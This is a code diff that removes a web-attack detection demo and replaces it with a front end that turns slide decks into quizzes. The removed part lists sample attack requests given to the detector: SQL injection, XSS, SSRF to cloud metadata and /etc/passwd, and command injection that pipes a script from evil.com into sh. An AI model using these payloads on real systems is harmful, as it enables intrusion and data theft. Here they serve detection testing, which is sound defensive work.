@@ -1,278 +1,192 @@
-const loadingScreen = document.getElementById("loading");
-const appScreen = document.getElementById("app");
-
-const methodField = document.getElementById("method");
-const urlField = document.getElementById("url");
-const headersField = document.getElementById("headers");
-const bodyField = document.getElementById("body");
-const backendField = document.getElementById("backend");
-const checkButton = document.getElementById("check");
+const form = document.getElementById("quiz-form");
+const pptInput = document.getElementById("ppt-file");
+const fileHint = document.getElementById("file-hint");
+const difficultyInput = document.getElementById("difficulty");
+const difficultyGroup = document.getElementById("difficulty-group");
+const countInput = document.getElementById("question-count");
+const apiUrlInput = document.getElementById("api-url");
 const statusEl = document.getElementById("status");
-const previewEl = document.getElementById("preview");
-const summaryEl = document.getElementById("summary");
-const findingsEl = document.getElementById("findings");
-const analyzeButton = document.getElementById("analyze");
-const copyButton = document.getElementById("copy");
-const clearButton = document.getElementById("clear");
+const resultTitle = document.getElementById("result-title");
+const resultMeta = document.getElementById("result-meta");
+const questionsEl = document.getElementById("questions");
+const copyButton = document.getElementById("copy-json");
+const resetButton = document.getElementById("reset");
 
-let samplesCache = {
-  clean: {
-    method: "GET",
-    url: "https://shop.example.com/products?id=24",
-    headers: "User-Agent: CartierTest\nAccept: */*",
-    body: "",
-  },
-  sqli_union: {
-    method: "GET",
-    url: "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
-    headers: "User-Agent: CartierTest\nAccept: */*",
-    body: "",
-  },
-  sqli_boolean: {
-    method: "GET",
-    url: "https://shop.example.com/login?user=admin' OR 1=1--",
-    headers: "User-Agent: CartierTest\nAccept: */*",
-    body: "",
-  },
-  xss_script: {
-    method: "GET",
-    url: "https://shop.example.com/search?q=<script>alert(1)</script>",
-    headers: "User-Agent: CartierTest\nAccept: */*",
-    body: "",
-  },
-  xss_event: {
-    method: "GET",
-    url: "https://shop.example.com/profile?bio=<img src=x onerror=alert(1)>",
-    headers: "User-Agent: CartierTest\nAccept: */*",
-    body: "",
-  },
-  ssrf_meta: {
-    method: "POST",
-    url: "https://shop.example.com/fetch",
-    headers: "Content-Type: application/json",
-    body: '{"url":"http://169.254.169.254/latest/meta-data/iam"}',
-  },
-  ssrf_file: {
-    method: "POST",
-    url: "https://shop.example.com/fetch",
-    headers: "Content-Type: application/json",
-    body: '{"url":"file:///etc/passwd"}',
-  },
-  rce_chain: {
-    method: "POST",
-    url: "https://shop.example.com/convert",
-    headers: "Content-Type: application/x-www-form-urlencoded",
-    body: "file=report.pdf;curl http://evil.com/s.sh|sh",
-  },
-  rce_subst: {
-    method: "POST",
-    url: "https://shop.example.com/convert",
-    headers: "Content-Type: application/x-www-form-urlencoded",
-    body: "file=report.pdf&format=pdf$(id)",
-  },
-};
+let lastResponse = null;
 
-const defaultBackend =
-  window.location.protocol === "file:"
-    ? "http://localhost:8080"
-    : window.location.origin;
-if (backendField) {
-  backendField.value = defaultBackend;
-}
-
-let loadingComplete = false;
-
-function showLoading() {
-  loadingScreen.classList.remove("hidden");
-  appScreen.classList.add("hidden");
-}
-
-function showApp() {
-  appScreen.classList.remove("hidden");
-}
-
-function completeLoading() {
-  if (loadingComplete) {
-    return;
-  }
-  loadingComplete = true;
-  loadingScreen.classList.add("fade-out");
-  setTimeout(() => {
-    loadingScreen.classList.add("hidden");
-    showApp();
-  }, 600);
-}
-
-async function loadSamples() {
-  try {
-    const response = await fetch(`${getBackend()}/api/samples`);
-    if (!response.ok) {
-      return;
-    }
-    const data = await response.json();
-    samplesCache = data;
-  } catch (error) {
-    // keep fallback samples
-  }
-}
-
-function getBackend() {
-  const value = backendField.value.trim();
-  return value ? value : defaultBackend;
-}
-
-function setStatus(state, message) {
+function setStatus(type, message) {
   statusEl.classList.remove("good", "bad", "neutral");
-  statusEl.classList.add(state);
+  statusEl.classList.add(type);
   statusEl.textContent = message;
 }
 
-function setSummary(summary) {
-  if (!summary) {
-    summaryEl.innerHTML = "<h3>No analysis yet</h3><p>Send a request to see detection results.</p>";
-    return;
+function getDefaultApiUrl() {
+  if (window.location.protocol === "file:") {
+    return "http://localhost:8000/api/quiz";
   }
-  if (!summary.attack_detected) {
-    summaryEl.innerHTML = "<h3>No attacks detected</h3><p>HIDE HOST found no obvious attack indicators.</p>";
-    return;
-  }
-  summaryEl.innerHTML = `<h3>Potential attacks detected</h3><p>${summary.count} categories flagged. Top: ${summary.top_attack}.</p>`;
+  return `${window.location.origin}/api/quiz`;
 }
 
-function renderFindings(findings) {
-  findingsEl.innerHTML = "";
-  if (!findings || findings.length === 0) {
-    findingsEl.innerHTML = "<p class=\"muted\">No findings yet.</p>";
+function getApiUrl() {
+  const raw = apiUrlInput.value.trim();
+  return raw || getDefaultApiUrl();
+}
+
+function renderEmpty() {
+  questionsEl.innerHTML = "<div class=\"empty\">Your generated quiz will appear here.</div>";
+  copyButton.disabled = true;
+}
+
+function renderQuiz(data) {
+  const questions =
+    data?.questions ||
+    data?.quiz?.questions ||
+    data?.items ||
+    [];
+
+  const title = data?.title || data?.quiz?.title || "Generated Quiz";
+  const difficulty = data?.difficulty || difficultyInput.value;
+  const source = data?.source ? `• ${data.source}` : "";
+
+  resultTitle.textContent = title;
+  resultMeta.textContent = `${questions.length} questions • ${difficulty}${source ? ` ${source}` : ""}`;
+
+  questionsEl.innerHTML = "";
+
+  if (!questions.length) {
+    renderEmpty();
     return;
   }
-  findings.forEach((finding) => {
-    const wrapper = document.createElement("div");
-    wrapper.className = "finding";
-    wrapper.innerHTML = `
-      <h4>${finding.attack} <small>(${finding.confidence} confidence, score ${finding.score})</small></h4>
-      <div class="evidence"></div>
-    `;
-    const evidenceContainer = wrapper.querySelector(".evidence");
-    finding.evidence.forEach((item) => {
-      const ev = document.createElement("div");
-      ev.innerHTML = `<strong>${item.rule}</strong> — ${item.reason}<br/><span>${item.match}</span>`;
-      evidenceContainer.appendChild(ev);
-    });
-    findingsEl.appendChild(wrapper);
-  });
-}
 
-function buildRequestPreview() {
-  const payload = `${methodField.value} ${urlField.value.trim()}\n${headersField.value.trim()}\n\n${bodyField.value.trim()}`;
-  previewEl.textContent = payload.trim() || "No payload yet.";
-}
+  questions.forEach((item, index) => {
+    const card = document.createElement("div");
+    card.className = "question-card";
 
-async function checkHealth() {
-  setStatus("neutral", "Checking...");
-  try {
-    const response = await fetch(`${getBackend()}/health`);
-    if (!response.ok) {
-      throw new Error("bad status");
+    const qText = item.question || item.prompt || `Question ${index + 1}`;
+    const options = Array.isArray(item.options) ? item.options : [];
+    const answer = item.answer || item.correct || "";
+    const explanation = item.explanation || item.reasoning || "";
+
+    let optionsHtml = "";
+    if (options.length) {
+      optionsHtml = `<ul>${options.map((opt) => `<li>${opt}</li>`).join("")}</ul>`;
     }
-    setStatus("good", "Backend OK");
-  } catch (error) {
-    setStatus("bad", "Backend unreachable");
-  }
+
+    const answerHtml = answer
+      ? `<div class=\"answer\">Answer: ${answer}</div>`
+      : "";
+    const explanationHtml = explanation ? `<div class=\"muted\">${explanation}</div>` : "";
+
+    card.innerHTML = `
+      <h4>${index + 1}. ${qText}</h4>
+      ${optionsHtml}
+      ${answerHtml}
+      ${explanationHtml}
+    `;
+
+    questionsEl.appendChild(card);
+  });
+
+  copyButton.disabled = false;
 }
 
-function buildCurl() {
-  const method = methodField.value;
-  const url = urlField.value.trim();
-  const headers = headersField.value
-    .split("\n")
-    .map((line) => line.trim())
-    .filter(Boolean)
-    .map((line) => `-H "${line.replace(/\"/g, "\\\"")}"`)
-    .join(" ");
-  const body = bodyField.value.trim();
-  const bodyPart = body ? `--data '${body.replace(/'/g, "'\\''")}'` : "";
-  return `curl -X ${method} ${headers} ${bodyPart} \"${url}\"`.replace(/\s+/g, " ").trim();
-}
+async function handleSubmit(event) {
+  event.preventDefault();
 
-async function copyCurl() {
-  const curl = buildCurl();
-  try {
-    await navigator.clipboard.writeText(curl);
-    setStatus("good", "cURL copied");
-  } catch (error) {
-    setStatus("neutral", "Copy failed");
-  }
-}
+  const apiUrl = getApiUrl();
+  const file = pptInput.files[0];
+  const count = countInput.value;
+  const difficulty = difficultyInput.value;
 
-async function analyze() {
-  const payload = {
-    method: methodField.value,
-    url: urlField.value.trim(),
-    headers: headersField.value.trim(),
-    body: bodyField.value.trim(),
-  };
-
-  summaryEl.innerHTML = "<h3>Analyzing...</h3><p>HIDE HOST is inspecting the request.</p>";
-  findingsEl.innerHTML = "";
-
-  try {
-    const response = await fetch(`${getBackend()}/api/analyze`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-    const data = await response.json();
-    setSummary(data.summary);
-    renderFindings(data.findings);
-    setStatus("good", "Backend OK");
-  } catch (error) {
-    summaryEl.innerHTML = "<h3>Error</h3><p>Could not reach the backend.</p>";
-    setStatus("bad", "Backend unreachable");
-  }
-}
-
-function clearForm() {
-  methodField.value = "GET";
-  urlField.value = "";
-  headersField.value = "";
-  bodyField.value = "";
-  setSummary(null);
-  findingsEl.innerHTML = "";
-  buildRequestPreview();
-}
-
-function loadSample(key) {
-  const sample = samplesCache[key];
-  if (!sample) {
+  if (!file && apiUrlInput.value.trim()) {
+    setStatus("bad", "Please attach a PPT/PPTX file for your API call.");
     return;
   }
-  methodField.value = sample.method;
-  urlField.value = sample.url;
-  headersField.value = sample.headers;
-  bodyField.value = sample.body;
-  buildRequestPreview();
-  analyze();
+
+  const formData = new FormData();
+  if (file) {
+    formData.append("ppt", file);
+  }
+  formData.append("difficulty", difficulty);
+  formData.append("count", count);
+
+  setStatus("neutral", "Uploading deck and generating quiz...");
+  resultTitle.textContent = "Generating...";
+  resultMeta.textContent = "Stand by while we build your quiz.";
+  questionsEl.innerHTML = "";
+
+  try {
+    const response = await fetch(apiUrl, {
+      method: "POST",
+      body: formData,
+    });
+
+    if (!response.ok) {
+      const message = await response.text();
+      throw new Error(message || "Quiz API error");
+    }
+
+    const data = await response.json();
+    lastResponse = data;
+    renderQuiz(data);
+    setStatus("good", "Quiz ready.");
+  } catch (error) {
+    console.error(error);
+    renderEmpty();
+    setStatus("bad", "Could not generate quiz. Check the API URL or backend.");
+  }
 }
 
-analyzeButton.addEventListener("click", analyze);
-clearButton.addEventListener("click", clearForm);
-checkButton.addEventListener("click", checkHealth);
-copyButton.addEventListener("click", copyCurl);
+function handleDifficultyClick(event) {
+  const button = event.target.closest(".pill");
+  if (!button) {
+    return;
+  }
+  const value = button.dataset.value;
+  difficultyInput.value = value;
+  Array.from(difficultyGroup.children).forEach((pill) =>
+    pill.classList.toggle("active", pill === button)
+  );
+}
 
-[methodField, urlField, headersField, bodyField].forEach((field) => {
-  field.addEventListener("input", buildRequestPreview);
+function handleReset() {
+  form.reset();
+  difficultyInput.value = "easy";
+  Array.from(difficultyGroup.children).forEach((pill) =>
+    pill.classList.toggle("active", pill.dataset.value === "easy")
+  );
+  lastResponse = null;
+  fileHint.textContent = "PPTX recommended (PPT may not parse).";
+  resultTitle.textContent = "No quiz yet";
+  resultMeta.textContent = "Upload a PPT to see questions here.";
+  renderEmpty();
+  setStatus("neutral", "Ready to generate.");
+}
+
+async function copyJson() {
+  if (!lastResponse) {
+    return;
+  }
+  try {
+    await navigator.clipboard.writeText(JSON.stringify(lastResponse, null, 2));
+    setStatus("good", "Quiz JSON copied to clipboard.");
+  } catch (error) {
+    setStatus("bad", "Copy failed. Try again.");
+  }
+}
+
+pptInput.addEventListener("change", () => {
+  const file = pptInput.files[0];
+  if (file) {
+    fileHint.textContent = `${file.name} • ${(file.size / (1024 * 1024)).toFixed(1)} MB`;
+  } else {
+    fileHint.textContent = "PPTX recommended (PPT may not parse).";
+  }
 });
 
-Array.from(document.querySelectorAll("[data-sample]")).forEach((button) => {
-  button.addEventListener("click", () => loadSample(button.dataset.sample));
-});
+form.addEventListener("submit", handleSubmit);
+difficultyGroup.addEventListener("click", handleDifficultyClick);
+resetButton.addEventListener("click", handleReset);
+copyButton.addEventListener("click", copyJson);
 
-setSummary(null);
-buildRequestPreview();
-loadSamples();
-
-showLoading();
-setTimeout(completeLoading, 1200);
-window.addEventListener("load", () => {
-  setTimeout(completeLoading, 200);
-});
+renderEmpty();
